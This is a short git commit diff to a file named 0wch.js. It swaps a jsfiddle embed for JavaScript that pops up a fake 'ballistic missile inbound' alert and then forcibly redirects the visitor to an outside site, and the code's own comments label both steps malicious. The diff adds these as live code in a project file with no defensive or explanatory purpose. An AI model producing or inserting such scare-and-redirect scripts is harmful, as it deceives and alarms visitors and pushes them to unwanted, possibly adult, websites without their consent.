18f0f44e8a5893eacc448c992ea30e0a966cb61b
SwiftSearcher <161917019+SwiftSearcher@users.noreply.github.com>
2024-03-17 00:02:25 -0500

    Update 0wch.js

--- 0wch.js
+++ 0wch.js
@@ -1,1 +1,5 @@
-<script async src="//jsfiddle.net/Bevee17/mwhLpr49/embed/result/"></script>
+// Display an alert box with a malicious message
+alert('BALLISTIC MISSLE INBOUND, PERPARE FOR BTG 0WCHIE');
+// Redirect the user to a malicious website
+window.location.href = 'https://subculture.com/robot/allteen.html';
+
